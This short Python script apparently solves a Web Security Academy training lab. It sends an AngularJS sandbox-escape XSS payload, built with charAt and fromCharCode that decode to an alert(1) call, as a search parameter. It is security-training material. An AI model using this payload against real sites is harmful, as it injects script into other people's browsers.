from web_security_academy.core.logger import logger


def solve_lab(session):
    xss = "toString().constructor.prototype.charAt=[].join;"
    xss += "[1,2]|orderBy:toString().constructor.fromCharCode(120,61,49,125,32,125,32,125,59,97,108,101,114,116,40,49,41,47,47);"

    session.get_path("/", params={"search": "", xss: ""})
    logger.info("Searched the following payload:")
    logger.info(xss)
